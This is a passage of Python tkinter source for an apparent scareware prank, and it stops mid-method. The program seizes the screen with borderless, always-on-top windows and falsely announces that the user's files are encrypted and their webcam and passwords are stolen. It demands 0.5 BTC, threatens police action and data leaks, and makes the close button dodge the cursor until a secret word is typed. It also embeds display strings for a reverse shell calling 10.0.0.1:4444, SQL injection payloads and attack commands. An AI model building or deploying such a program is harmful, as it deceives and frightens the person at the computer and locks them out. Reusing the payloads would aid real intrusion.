import tkinter as tk
from tkinter import font, scrolledtext
import threading
import time
import random
import sys
import os
from datetime import datetime

# ============ CONFIGURATION ============
ESCAPE_WORD = "neshley"

# ============ HACKING DATA GENERATORS ============

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def get_random_mac():
    return ':'.join([f"{random.randint(0,255):02X}" for _ in range(6)])

# Global escape buffer
global_buffer = ""
escape_triggered = False

# Realistic terminal commands
terminal_commands = [
    "nmap -sS -sV -p 1-1000 192.168.1.0/24",
    "msfconsole -q -r exploit.rc",
    "python3 eternalblue_exploit.py --target 192.168.1.105",
    "hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form",
    "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
    "aircrack-ng -w rockyou.txt -b 00:11:22:33:44:55 capture.cap",
    "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
    "wireshark -i eth0 -k -f 'port 80 or port 443'",
    "tcpdump -i eth0 -w capture.pcap host 192.168.1.1",
    "netdiscover -r 192.168.1.0/24",
]

# Short exploit scripts
hacker_scripts = [
    '''#!/usr/bin/env python3
# EternalBlue Exploit (MS17-010)
import socket, sys

def exploit(target):
    sock = socket.socket()
    sock.connect((target, 445))
    sock.send(b'\\\\x00\\\\x00\\\\x00\\\\x90')
    print(f"[+] {target} exploited!")

exploit("192.168.1.105")
''',
    
    '''#!/usr/bin/env python3
# SQL Injection Scanner
import requests

payloads = ["' OR '1'='1", "'; DROP TABLE users--"]
for p in payloads:
    r = requests.get(f"http://target.com?id={p}")
    if "error" in r.text:
        print(f"[VULN] {p}")
''',
    
    '''#!/usr/bin/env python3
# Reverse Shell
import socket, subprocess

s = socket.socket()
s.connect(("10.0.0.1", 4444))
subprocess.call(["/bin/bash", "-i"])
''',
    
    '''#!/usr/bin/env python3
# Port Scanner
import socket

for port in range(1, 1025):
    s = socket.socket()
    if s.connect_ex(("192.168.1.1", port)) == 0:
        print(f"[+] Port {port} OPEN")
    s.close()
'''
]

# Hacking messages
hacking_messages = [
    "⚠️ INTRUSION DETECTED",
    "🔓 FIREWALL BYPASSED",
    "💀 ROOT ACCESS GRANTED",
    "📡 BACKDOOR INSTALLED",
    "🔑 CREDENTIALS HARVESTED",
    "📁 DATA EXFILTRATION",
    "💻 SYSTEM COMPROMISED",
    "🔒 ENCRYPTION CRACKED",
    "⚡ REMOTE SHELL OPENED",
    "🐍 MALWARE DEPLOYED",
    "📸 WEBCAM ACCESSED",
    "🎤 MICROPHONE ENABLED",
    "💰 RANSOMWARE ACTIVE",
    "🌐 NETWORK OWNED",
    "💳 CREDIT CARDS STOLEN"
]

def check_escape(buffer, root=None):
    """Global escape check"""
    global global_buffer, escape_triggered
    global_buffer += buffer
    
    if len(global_buffer) > 50:
        global_buffer = global_buffer[-30:]
    
    if ESCAPE_WORD in global_buffer.lower() and not escape_triggered:
        escape_triggered = True
        if root:
            show_cancellation_sequence(root)
        return True
    return False

def show_cancellation_sequence(root):
    """Show dramatic hacker cancellation sequence"""
    # Destroy all existing windows
    for widget in root.winfo_children():
        try:
            widget.destroy()
        except:
            pass
    
    # Clear root
    for widget in root.winfo_children():
        try:
            widget.destroy()
        except:
            pass
    
    root.configure(bg='#000000')
    
    # Create cancellation display
    cancel_frame = tk.Frame(root, bg='#000000')
    cancel_frame.pack(fill=tk.BOTH, expand=True)
    
    # Main cancellation label
    cancel_label = tk.Label(
        cancel_frame,
        text="",
        font=('Courier', 12, 'bold'),
        fg='#00ff00',
        bg='#000000',
        justify=tk.LEFT
    )
    cancel_label.pack(expand=True, padx=50, pady=20)
    
    # Status label
    status_label = tk.Label(
        cancel_frame,
        text="",
        font=('Courier', 14, 'bold'),
        fg='#00ff00',
        bg='#000000'
    )
    status_label.pack(pady=10)
    
    # Cancellation messages
    cancel_messages = [
        "",
        "═══════════════════════════════════════════════════════",
        "           ⚠️  UNAUTHORIZED ACCESS DETECTED  ⚠️",
        "═══════════════════════════════════════════════════════",
        "",
        "[!] ALERT: Security override code received...",
        "[!] Authenticating: neshley",
        "[✓] Identity verified",
        "[✓] Emergency shutdown sequence initiated",
        "",
        "───────────────────────────────────────────────────────",
        "  TERMINATING ALL ACTIVE CONNECTIONS",
        "───────────────────────────────────────────────────────",
        "[*] Closing backdoor on port 4444...",
        "[*] Disconnecting from C2 server at 185.234.72.11...",
        "[*] Removing persistence mechanisms...",
        "[*] Killing process ID: " + str(os.getpid()),
        "[*] Terminating keylogger...",
        "[*] Stopping screen capture...",
        "[*] Disabling microphone access...",
        "[*] Closing webcam stream...",
        "",
        "───────────────────────────────────────────────────────",
        "  CANCELING DATA EXFILTRATION",
        "───────────────────────────────────────────────────────",
        "[*] Stopping upload to dark web...",
        "[*] Aborting transfer of passwords.txt",
        "[*] Aborting transfer of banking_info.dat",
        "[*] Aborting transfer of personal_photos.zip",
        "[*] Aborting transfer of browser_history.db",
        "[*] Purging temporary exfiltration files...",
        "[✓] Data transfer interrupted",
        "[✓] 847 files saved from upload",
        "",
        "───────────────────────────────────────────────────────",
        "  DECRYPTING FILES",
        "───────────────────────────────────────────────────────",
        "[*] Loading decryption key...",
        "[*] Key: neshley-2024-xxxx-xxxx-xxxxxxxx",
        "[*] Decrypting Documents/...",
        "[*] Decrypting Photos/...",
        "[*] Decrypting Desktop/...",
        "[*] Decrypting Downloads/...",
        "[✓] All files successfully decrypted",
        "[✓] Original file names restored",
        "",
        "───────────────────────────────────────────────────────",
        "  REMOVING MALWARE",
        "───────────────────────────────────────────────────────",
        "[*] Uninstalling ransomware component...",
        "[*] Removing registry persistence...",
        "[*] Cleaning temporary directories...",
        "[*] Restoring firewall settings...",
        "[*] Re-enabling Windows Defender...",
        "[*] Removing scheduled tasks...",
        "[✓] Malware completely removed",
        "",
        "───────────────────────────────────────────────────────",
        "  RESTORING SYSTEM SECURITY",
        "───────────────────────────────────────────────────────",
        "[*] Resetting security policies...",
        "[*] Updating firewall rules...",
        "[*] Scanning for residual threats...",
        "[*] Patching exploited vulnerabilities...",
        "[*] Restoring from secure backup...",
        "[✓] No threats detected",
        "[✓] System security restored to normal",
        "",
        "───────────────────────────────────────────────────────",
        "  CLEANING TRACES",
        "───────────────────────────────────────────────────────",
        "[*] Clearing command history...",
        "[*] Wiping log files...",
        "[*] Removing backdoor accounts...",
        "[*] Closing reverse shells...",
        "[*] Terminating all remote sessions...",
        "[✓] All traces removed",
        "",
        "═══════════════════════════════════════════════════════",
        "           ✅  ATTACK SUCCESSFULLY CANCELED  ✅",
        "═══════════════════════════════════════════════════════",
        "",
        "[✓] All processes terminated",
        "[✓] All connections closed",
        "[✓] All files restored",
        "[✓] System secured",
        "",
        "         Thank you for using the security override.",
        "              Your system is now safe.",
        "",
        "         This window will close in 10 seconds...",
    ]
    
    # Status messages that will flash
    status_messages = [
        "[ CANCELLING ATTACK... ]",
        "[ TERMINATING PROCESSES... ]",
        "[ DECRYPTING FILES... ]",
        "[ RESTORING SYSTEM... ]",
        "[ REMOVING MALWARE... ]",
        "[ CLEANING UP... ]",
        "[ SYSTEM SECURED ✓ ]",
        "[ SHUTTING DOWN... ]"
    ]
    
    def type_text(index=0):
        """Type out cancellation text with hacker effect"""
        if index < len(cancel_messages):
            text = cancel_messages[index]
            cancel_label.config(text=cancel_label.cget('text') + text + '\n')
            
            # Update status based on content
            if "CANCELING DATA" in text:
                status_label.config(text="[ CANCELLING DATA EXFILTRATION... ]", fg='#ffff00')
            elif "DECRYPTING" in text:
                status_label.config(text="[ DECRYPTING YOUR FILES... ]", fg='#00ff00')
            elif "REMOVING MALWARE" in text:
                status_label.config(text="[ REMOVING MALICIOUS SOFTWARE... ]", fg='#ff8800')
            elif "RESTORING SYSTEM" in text:
                status_label.config(text="[ RESTORING SYSTEM SECURITY... ]", fg='#00aaff')
            elif "CLEANING TRACES" in text:
                status_label.config(text="[ CLEANING ALL TRACES... ]", fg='#ff00ff')
            elif "SUCCESSFULLY CANCELED" in text:
                status_label.config(text="[ ✅ ATTACK CANCELED SUCCESSFULLY ✅ ]", fg='#00ff00')
            
            root.after(50, type_text, index + 1)
        else:
            # Final animation
            animate_completion(status_label)
    
    def animate_completion(status_label):
        """Animate the completion status"""
        colors = ['#00ff00', '#00cc00', '#009900', '#00ff00', '#00cc00']
        texts = [
            "✅ SYSTEM SECURED - SHUTTING DOWN ✅",
            "✅ ALL FILES RESTORED ✅",
            "✅ NO DATA LOST ✅",
            "✅ THREAT NEUTRALIZED ✅"
        ]
        
        def flash(index=0):
            if index < 20:
                status_label.config(
                    text=random.choice(texts),
                    fg=random.choice(colors)
                )
                root.after(200, flash, index + 1)
            else:
                status_label.config(
                    text="SYSTEM WILL EXIT IN 3 SECONDS...",
                    fg='#ffffff'
                )
                root.after(3000, final_exit)
        
        flash()
    
    def final_exit():
        """Final exit"""
        try:
            root.destroy()
        except:
            pass
        sys.exit(0)
    
    # Start the typing animation
    root.after(500, type_text)

class SpyPopup:
    """Small popup that watches the user - no buttons"""
    def __init__(self, parent, main_popup):
        self.parent = parent
        self.main_popup = main_popup
        self.spy_window = None
        self.warning_window = None
        
    def create_spy_window(self):
        if escape_triggered:
            return
        try:
            self.spy_window = tk.Toplevel(self.parent)
            
            w, h = 300, 200
            x = self.spy_window.winfo_screenwidth() - w - 20
            y = self.spy_window.winfo_screenheight() - h - 50
            self.spy_window.geometry(f"{w}x{h}+{x}+{y}")
            
            self.spy_window.configure(bg='#000000')
            self.spy_window.attributes('-topmost', True)
            self.spy_window.overrideredirect(True)
            
            self.spy_window.bind('<Key>', self.on_key)
            self.spy_window.focus_set()
            
            border = tk.Frame(self.spy_window, bg='#ff0000', bd=2)
            border.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
            
            main = tk.Frame(border, bg='#0a0000')
            main.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
            
            self.eye_label = tk.Label(
                main,
                text="👁️  WATCHING YOU  👁️",
                font=('Courier', 12, 'bold'),
                fg='#ff0000',
                bg='#0a0000',
                pady=5
            )
            self.eye_label.pack()
            
            tk.Frame(main, bg='#ff0000', height=1).pack(fill=tk.X, padx=10, pady=5)
            
            self.activity_label = tk.Label(
                main,
                text="MONITORING ACTIVITY...",
                font=('Courier', 9, 'bold'),
                fg='#00ff00',
                bg='#0a0000'
            )
            self.activity_label.pack(pady=3)
            
            self.mouse_pos_label = tk.Label(
                main,
                text="Mouse: Unknown",
                font=('Courier', 8),
                fg='#ff8888',
                bg='#0a0000'
            )
            self.mouse_pos_label.pack()
            
            self.key_count = 0
            self.key_label = tk.Label(
                main,
                text="Keys captured: 0",
                font=('Courier', 8),
                fg='#ff8888',
                bg='#0a0000'
            )
            self.key_label.pack()
            
            self.click_count = 0
            self.click_label = tk.Label(
                main,
                text="Clicks detected: 0",
                font=('Courier', 8),
                fg='#ff8888',
                bg='#0a0000'
            )
            self.click_label.pack()
            
            self.escape_attempts = 0
            self.spy_warning = tk.Label(
                main,
                text="⚠️ ESCAPE ATTEMPTS: 0",
                font=('Courier', 8, 'bold'),
                fg='#ffff00',
                bg='#0a0000'
            )
            self.spy_warning.pack(pady=5)
            
            self.spy_window.bind('<Motion>', self.track_mouse)
            self.spy_window.bind('<Button-1>', self.track_click)
            
            self.animate_eye()
            self.track_global_mouse()
            self.stay_on_top()
            
        except Exception as e:
            print(f"Spy window error: {e}")
    
    def on_key(self, event):
        if event.char.isprintable():
            check_escape(event.char, self.parent)
    
    def create_warning_popup(self, reason="close_attempt"):
        if self.warning_window or escape_triggered:
            return
            
        try:
            self.warning_window = tk.Toplevel(self.parent)
            
            w, h = 400, 250
            x = (self.warning_window.winfo_screenwidth() - w) // 2
            y = (self.warning_window.winfo_screenheight() - h) // 2
            self.warning_window.geometry(f"{w}x{h}+{x}+{y}")
            
            self.warning_window.configure(bg='#000000')
            self.warning_window.attributes('-topmost', True)
            self.warning_window.overrideredirect(True)
            
            self.warning_window.bind('<Key>', self.on_warning_key)
            self.warning_window.focus_set()
            
            border = tk.Frame(self.warning_window, bg='#ff0000', bd=3)
            border.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
            
            main = tk.Frame(border, bg='#1a0000')
            main.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
            
            if reason == "close_attempt":
                header_text = "⛔  CLOSE ATTEMPT DETECTED!  ⛔"
                msg = "YOU CANNOT CLOSE THIS WINDOW!\n\nYOUR SYSTEM IS LOCKED\nALL ACTIONS ARE BEING MONITORED"
            elif reason == "minimize_attempt":
                header_text = "⛔  MINIMIZE ATTEMPT DETECTED!  ⛔"
                msg = "YOU CANNOT HIDE FROM US!\n\nWE SEE EVERYTHING YOU DO\nDO NOT TRY TO ESCAPE"
            else:
                header_text = "⛔  UNAUTHORIZED ACTION!  ⛔"
                msg = "ALL ACTIONS ARE LOGGED!\n\nYOUR IP HAS BEEN RECORDED\nLAW ENFORCEMENT NOTIFIED"
            
            tk.Label(
                main,
                text=header_text,
                font=('Courier', 14, 'bold'),
                fg='#ff0000',
                bg='#1a0000',
                pady=10
            ).pack()
            
            tk.Frame(main, bg='#ff0000', height=1).pack(fill=tk.X, padx=20, pady=5)
            
            tk.Label(
                main,
                text=msg,
                font=('Courier', 10, 'bold'),
                fg='#ff4444',
                bg='#1a0000',
                justify=tk.CENTER,
                pady=10
            ).pack()
            
            tk.Frame(main, bg='#ff0000', height=1).pack(fill=tk.X, padx=20, pady=5)
            
            self.warning_count = 5
            self.warning_count_label = tk.Label(
                main,
                text=f"THIS WARNING WILL CLOSE IN: {self.warning_count}s",
                font=('Courier', 9, 'bold'),
                fg='#ffff00',
                bg='#1a0000'
            )
            self.warning_count_label.pack(pady=5)
            
            threats = [
                "⚠️ TIME PENALTY ADDED: +30 SECONDS",
                "⚠️ MORE FILES HAVE BEEN ENCRYPTED",
                "⚠️ YOUR LOCATION HAS BEEN SHARED",
                "⚠️ ADDITIONAL DATA IS BEING STOLEN",
                "⚠️ THIS INCIDENT HAS BEEN LOGGED"
            ]
            
            self.warning_threat_label = tk.Label(
                main,
                text=random.choice(threats),
                font=('Courier', 9),
                fg='#ff8800',
                bg='#1a0000',
                pady=5
            )
            self.warning_threat_label.pack()
            
            self.escape_attempts += 1
            if hasattr(self, 'spy_warning') and self.spy_window:
                self.spy_warning.config(text=f"⚠️ ESCAPE ATTEMPTS: {self.escape_attempts}")
            
            self.countdown_warning()
            self.flash_warning()
            
        except Exception as e:
            print(f"Warning popup error: {e}")
    
    def on_warning_key(self, event):
        if event.char.isprintable():
            check_escape(event.char, self.parent)
    
    def countdown_warning(self):
        if self.warning_window and self.warning_count > 0:
            self.warning_count_label.config(text=f"THIS WARNING WILL CLOSE IN: {self.warning_count}s")
            self.warning_count -= 1
            self.warning_window.after(1000, self.countdown_warning)
        elif self.warning_window:
            self.close_warning()
    
    def flash_warning(self):
        if self.warning_window:
            colors = ['#ff0000', '#ff4444', '#ff0000', '#cc0000']
            color = colors[int(time.time() * 4) % len(colors)]
            for child in self.warning_window.winfo_children():
                if isinstance(child, tk.Frame):
                    child.configure(bg=color)
            self.warning_window.after(200, self.flash_warning)
    
    def close_warning(self):
        if self.warning_window:
            self.warning_window.destroy()
            self.warning_window = None
    
    def track_mouse(self, event):
        if self.spy_window:
            self.mouse_pos_label.config(text=f"Mouse: X:{event.x_root} Y:{event.y_root}")
    
    def track_click(self, event):
        self.click_count += 1
        if self.spy_window:
            self.click_label.config(text=f"Clicks detected: {self.click_count}")
    
    def track_global_mouse(self):
        if self.spy_window and not escape_triggered:
            x = self.spy_window.winfo_pointerx()
            y = self.spy_window.winfo_pointery()
            self.mouse_pos_label.config(text=f"Mouse: X:{x} Y:{y}")
            self.spy_window.after(200, self.track_global_mouse)
    
    def animate_eye(self):
        if not self.spy_window or escape_triggered:
            return
        eyes = ["👁️  WATCHING YOU  👁️", "🔴  MONITORING  🔴", "📹  RECORDING  📹", "🟢  TRACKING  🟢"]
        self.eye_label.config(text=random.choice(eyes))
        self.spy_window.after(2000, self.animate_eye)
    
    def stay_on_top(self):
        if self.spy_window and not escape_triggered:
            self.spy_window.lift()
            self.spy_window.attributes('-topmost', True)
            self.spy_window.after(500, self.stay_on_top)
    
    def add_keystroke(self):
        self.key_count += 1
        if self.spy_window:
            self.key_label.config(text=f"Keys captured: {self.key_count}")
    
    def close_all(self):
        if self.spy_window:
            self.spy_window.destroy()
            self.spy_window = None
        if self.warning_window:
            self.warning_window.destroy()
            self.warning_window = None


class HackerPopup:
    def __init__(self, parent):
        self.parent = parent
        self.popup = None
        self.countdown_seconds = 180
        self.countdown_id = None
        self.mouse_detected = False
        self.message_index = 0
        self.spy_popup = None
        
    def create_popup(self):
        if escape_triggered:
            return
        try:
            self.popup = tk.Toplevel(self.parent)
            
            w = self.popup.winfo_screenwidth()
            h = self.popup.winfo_screenheight()
            self.popup.geometry(f"{w}x{h}+0+0")
            
            self.popup.configure(bg='#000000')
            self.popup.attributes('-topmost', True)
            self.popup.attributes('-fullscreen', True)
            self.popup.overrideredirect(True)
            
            self.popup.bind('<Key>', self.on_key)
            self.popup.focus_set()
            
            self.spy_popup = SpyPopup(self.parent, self)
            self.spy_popup.create_spy_window()
            
            border = tk.Frame(self.popup, bg='#ff0000', bd=3)
            border.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
            
            main = tk.Frame(border, bg='#0a0000')
            main.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
            
            center_frame = tk.Frame(main, bg='#0a0000')
            center_frame.place(relx=0.5, rely=0.5, anchor='center')
            
            self.header_label = tk.Label(
                center_frame,
                text="⚠️  YOU HAVE BEEN HACKED  ⚠️",
                font=('Courier', 20, 'bold'),
                fg='#ff0000',
                bg='#0a0000',
                pady=10
            )
            self.header_label.pack()
            
            self.sub_label = tk.Label(
                center_frame,
                text="YOUR SYSTEM HAS BEEN COMPROMISED",
                font=('Courier', 14, 'bold'),
                fg='#ff4444',
                bg='#0a0000'
            )
            self.sub_label.pack()
            
            tk.Frame(center_frame, bg='#ff0000', height=2).pack(fill=tk.X, padx=20, pady=15)
            
            self.hack_messages = [
                "☠️  ALL YOUR FILES HAVE BEEN ENCRYPTED",
                "💀  WE HAVE FULL CONTROL OF YOUR SYSTEM",
                "🔑  ALL PASSWORDS HAVE BEEN STOLEN",
                "📸  YOUR WEBCAM HAS BEEN ACTIVATED",
                "🎤  YOUR MICROPHONE IS RECORDING",
                "📁  PERSONAL DATA IS BEING DOWNLOADED",
                "💳  FINANCIAL INFORMATION EXTRACTED",
                "🌐  YOUR LOCATION IS BEING TRACKED",
                "📧  YOUR CONTACTS WILL BE NOTIFIED",
                "🕵️  LAW ENFORCEMENT HAS BEEN ALERTED"
            ]
            
            self.msg_label = tk.Label(
                center_frame,
                text=self.hack_messages[0],
                font=('Courier', 12, 'bold'),
                fg='#ff8800',
                bg='#0a0000',
                pady=10
            )
            self.msg_label.pack()
            
            tk.Frame(center_frame, bg='#330000', height=2).pack(fill=tk.X, padx=20, pady=15)
            
            self.dont_turn_off = tk.Label(
                center_frame,
                text="⛔  DO NOT TURN OFF YOUR COMPUTER  ⛔",
                font=('Courier', 16, 'bold'),
                fg='#ffff00',
                bg='#330000',
                pady=10
            )
            self.dont_turn_off.pack(fill=tk.X, padx=20, pady=5)
            
            self.dont_warning = tk.Label(
                center_frame,
                text="TURNING OFF WILL CORRUPT ALL YOUR FILES PERMANENTLY",
                font=('Courier', 11, 'bold'),
                fg='#ff0000',
                bg='#330000',
                pady=5
            )
            self.dont_warning.pack(fill=tk.X, padx=20)
            
            tk.Frame(center_frame, bg='#330000', height=1).pack(fill=tk.X, padx=20, pady=15)
            
            countdown_frame = tk.Frame(center_frame, bg='#1a0000', bd=2, relief=tk.RAISED)
            countdown_frame.pack(pady=10, padx=30, fill=tk.X)
            
            tk.Label(
                countdown_frame,
                text="⏰  TIME UNTIL DATA IS RELEASED PUBLICLY  ⏰",
                font=('Courier', 11, 'bold'),
                fg='#ffff00',
                bg='#1a0000',
                pady=5
            ).pack()
            
            self.countdown_label = tk.Label(
                countdown_frame,
                text="03:00",
                font=('Courier', 30, 'bold'),
                fg='#ff0000',
                bg='#1a0000',
                pady=10
            )
            self.countdown_label.pack()
            
            info_frame = tk.Frame(center_frame, bg='#0a0000')
            info_frame.pack(pady=10)
            
            self.ip_label = tk.Label(
                info_frame,
                text=f"YOUR IP: {get_random_ip()}  |  STATUS: COMPROMISED  |  FILES: ENCRYPTED",
                font=('Courier', 9),
                fg='#ff6666',
                bg='#0a0000'
            )
            self.ip_label.pack()
            
            self.mouse_label = tk.Label(
                center_frame,
                text="[ MOUSE: NOT DETECTED ]",
                font=('Courier', 9),
                fg='#00ff00',
                bg='#0a0000'
            )
            self.mouse_label.pack(pady=5)
            
            btn_frame = tk.Frame(center_frame, bg='#0a0000')
            btn_frame.pack(pady=15)
            
            self.pay_btn = tk.Button(
                btn_frame,
                text="💰  PAY 0.5 BTC TO UNLOCK  💰",
                font=('Courier', 12, 'bold'),
                fg='#ffffff',
                bg='#cc0000',
                activebackground='#ff0000',
                activeforeground='#ffffff',
                relief=tk.RAISED,
                bd=3,
                padx=20,
                pady=8,
                command=self.on_pay,
                cursor='hand2'
            )
            self.pay_btn.pack(side=tk.LEFT, padx=10)
            
            self.close_btn = tk.Button(
                btn_frame,
                text="✖  CLOSE  ✖",
                font=('Courier', 12, 'bold'),
                fg='#cccccc',
                bg='#333333',
                activebackground='#555555',
                relief=tk.RAISED,
                bd=2,
                padx=20,
                pady=8,
                command=self.on_close
            )
            self.close_btn.pack(side=tk.LEFT, padx=10)
            
            self.popup.bind('<Motion>', self.on_mouse_move)
            self.popup.bind('<Enter>', self.on_mouse_enter)
            self.popup.bind('<Leave>', self.on_mouse_leave)
            self.close_btn.bind('<Enter>', self.on_close_hover)
            self.close_btn.bind('<Leave>', self.on_close_leave)
            
            self.rotate_messages()
            self.update_info()
            self.start_countdown()
            self.glow_effect()
            self.animate_header()
            self.stay_on_top()
            
        except Exception as e:
            print(f"Popup error: {e}")
    
    def on_key(self, event):
        if event.char.isprintable():
            check_escape(event.char, self.parent)
    
    def stay_on_top(self):
        if self.popup and not escape_triggered:
            self.popup.lift()
            self.popup.attributes('-topmost', True)
            self.popup.after(500, self.stay_on_top)
    
    def animate_header(self):
        if not self.popup or escape_triggered:
            return
        headers = [
            "⚠️  YOU HAVE BEEN HACKED  ⚠️",
            "💀  SYSTEM COMPROMISED  💀",
            "☠️  ALL DATA ENCRYPTED  ☠️",
            "🔴  YOU ARE BEING WATCHED  🔴",
            "⚠️  NO ESCAPE POSSIBLE  ⚠️"
        ]
        subs = [
            "YOUR SYSTEM HAS BEEN COMPROMISED",
            "WE HAVE FULL ACCESS TO YOUR DEVICE",
            "ALL SECURITY MEASURES BYPASSED",
            "YOUR IDENTITY HAS BEEN STOLEN",
            "DO NOT ATTEMPT TO CLOSE THIS"
        ]
        self.header_label.config(text=random.choice(headers))
        self.sub_label.config(text=random.choice(subs))
        self.popup.after(2000, self.animate_header)
    
    def rotate_messages(self):
        if not self.popup or escape_triggered:
            return
        self.msg_label.config(text=self.hack_messages[self.message_index])
        self.message_index = (self.message_index + 1) % len(self.hack_messages)
        self.popup.after(2500, self.rotate_messages)
    
    def on_mouse_enter(self, event):
        self.mouse_detected = True
        self.mouse_label.config(text="[ MOUSE: DETECTED ⚠️ - YOU ARE BEING TRACKED ]", fg='#ff0000')
    
    def on_mouse_leave(self, event):
        self.mouse_detected = False
        self.mouse_label.config(text="[ MOUSE: NOT DETECTED ]", fg='#00ff00')
    
    def on_mouse_move(self, event):
        if not self.mouse_detected:
            self.mouse_detected = True
            self.mouse_label.config(text="[ MOUSE: DETECTED ⚠️ - YOU ARE BEING TRACKED ]", fg='#ff0000')
        if hasattr(self, 'timeout_id'):
            self.popup.after_cancel(self.timeout_id)
        self.timeout_id = self.popup.after(2000, lambda: self.mouse_label.config(
            text="[ MOUSE: IDLE - STILL WATCHING ]", fg='#ffff00'
        ))
    
    def start_countdown(self):
        if escape_triggered:
            return
        if self.popup and self.countdown_seconds > 0:
            mins = self.countdown_seconds // 60
            secs = self.countdown_seconds % 60
            self.countdown_label.config(text=f"{mins:02d}:{secs:02d}")
            
            if self.countdown_seconds <= 10:
                if self.countdown_seconds % 2 == 0:
                    self.countdown_label.config(fg='#ffffff', font=('Courier', 34, 'bold'))
                    self.dont_turn_off.config(fg='#ffffff')
                else:
                    self.countdown_label.config(fg='#ff0000', font=('Courier', 34, 'bold'))
                    self.dont_turn_off.config(fg='#ffff00')
            elif self.countdown_seconds <= 30:
                self.countdown_label.config(fg='#ff0000', font=('Courier', 32, 'bold'))
                self.dont_turn_off.config(fg='#ff4444')
            elif self.countdown_seconds <= 60:
                self.countdown_label.config(fg='#ff4444')
            
            self.countdown_seconds -= 1
            self.countdown_id = self.popup.after(1000, self.start_countdown)
        elif self.popup:
            self.countdown_label.config(text="00:00", fg='#ff0000')
            self.header_label.config(text="⚠️  YOUR DATA HAS BEEN RELEASED!  ⚠️")
            self.dont_turn_off.config(text="☠️  IT'S TOO LATE - FILES DESTROYED  ☠️", fg='#ff0000')
            self.dont_warning.config(text="YOUR IDENTITY IS NOW PUBLIC", fg='#ff0000')
            self.popup.after(5000, self.close_popup)
    
    def update_info(self):
        if self.popup and not escape_triggered:
            self.ip_label.config(
                text=f"YOUR IP: {get_random_ip()}  |  STATUS: COMPROMISED  |  FILES: ENCRYPTED"
            )
            self.popup.after(3000, self.update_info)
    
    def glow_effect(self):
        if self.popup and not escape_triggered:
            intensity = int((time.time() * 3) % 2) * 100 + 100
            color = f'#{intensity:02x}0000'
            self.popup.configure(bg=color)
            self.popup.after(200, self.glow_effect)
    
    def on_close_hover(self, event):
        if escape_triggered:
            return
        self.close_btn.place(x=random.randint(400, 900), y=random.randint(500, 700))
        self.close_btn.config(cursor='pirate')
        self.dont_warning.config(text="⚠️  YOU CANNOT ESCAPE! STOP TRYING!  ⚠️", fg='#ff0000')
        if self.spy_popup:
            self.spy_popup.create_warning_popup("close_attempt")
        self.popup.after(2000, lambda: self.dont_warning.config(
            text="TURNING OFF WILL CORRUPT ALL YOUR FILES PERMANENTLY", fg='#ff0000'
        ))
    
    def on_close_leave(self, event):
        self.close_btn.config(cursor='arrow')
    
    def on_pay(self):
        if escape_triggered:
            return
        self.pay_btn.config(text="❌  PAYMENT REJECTED!  ❌", bg='#660000', fg='#ff0000')
        self.dont_warning.config(text="⚠️  PAYMENT FAILED - TIME PENALTY ADDED!  ⚠️", fg='#ff0000')
        self.countdown_seconds = max(5, self.countdown_seconds - 60)
        self.popup.after(2500, lambda: self.pay_btn.config(
            text="💰  PAY 0.5 BTC TO UNLOCK  💰", bg='#cc0000', fg='#ffffff'
        ))
        self.popup.after(2500, lambda: self.dont_warning.config(
            text="TURNING OFF WILL CORRUPT ALL YOUR FILES PERMANENTLY", fg='#ff0000'
        ))
    
    def on_close(self):
        if escape_triggered:
            return
        self.close_btn.place(x=random.randint(400, 900), y=random.randint(500, 700))
        self.dont_warning.config(text="⚠️  CLOSE ATTEMPT DETECTED! TIME ADDED!  ⚠️", fg='#ff0000')
        self.countdown_seconds = min(180, self.countdown_seconds + 45)
        if self.spy_popup:
            self.spy_popup.create_warning_popup("close_attempt")
        self.popup.after(2000, lambda: self.dont_warning.config(
            text="TURNING OFF WILL CORRUPT ALL YOUR FILES PERMANENTLY", fg='#ff0000'
        ))
    
    def close_popup(self):
        if self.popup:
            if self.countdown_id:
                self.popup.after_cancel(self.countdown_id)
            if hasattr(self, 'timeout_id'):
                self.popup.after_cancel(self.timeout_id)
            if self.spy_popup:
                self.spy_popup.close_all()
            self.popup.destroy()
            self.popup = None

class HackerInterface:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("SYSTEM COMPROMISED")
        
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
        
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        self.root.geometry(f"{screen_width}x{screen_height}+0+0")
        self.root.configure(bg='#000000')
        
        self.cfont = font.Font(family='Courier', size=10)
        self.hfont = font.Font(family='Courier', size=11, weight='bold')
        self.bfont = font.Font(family='Courier', size=14, weight='bold')
        self.tfont = font.Font(family='Courier', size=16, weight='bold')
        
        self.pane = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, bg='#003300')
        self.pane.pack(fill=tk.BOTH, expand=True)
        
        self.setup_left()
        self.setup_right()
        
        self.progress = 0
        self.pdir = 1
        self.si = 0
        self.sl = 0
        self.clicks = 0
        self.ci = 0
        
        self.root.bind('<Key>', self.on_key)
        self.root.focus_set()
        
        self.animate_header()
        self.animate_progress()
        self.update_logs()
        self.matrix()
        self.update_scripts()
        self.update_terminal()
        self.update_status()
        
        # Changed from 10 seconds to 60 seconds (1 minute)
        print("Popup will appear in 60 seconds (1 minute)...")
        self.root.after(60000, self.show_popup)
    
    def setup_left(self):
        left = tk.Frame(self.pane, bg='#0a0a0a')
        self.pane.add(left, width=700)
        
        h = tk.Frame(left, bg='#003300', bd=2, relief=tk.RAISED)
        h.pack(fill=tk.X, padx=5, pady=5)
        
        tk.Label(h, text="root@kali:~# TERMINAL", font=self.tfont, fg='#00ff00', bg='#003300').pack()
        tk.Label(h, text="[ACTIVE] EXPLOITS RUNNING", font=self.hfont, fg='#ff0000', bg='#003300').pack()
        
        self.term = scrolledtext.ScrolledText(left, font=self.cfont, bg='#000', fg='#0f0', 
                                               relief=tk.SUNKEN, bd=3, height=10)
        self.term.pack(fill=tk.X, padx=5, pady=5)
        
        self.script = scrolledtext.ScrolledText(left, font=self.cfont, bg='#000', fg='#0f0', 
                                                 relief=tk.SUNKEN, bd=3)
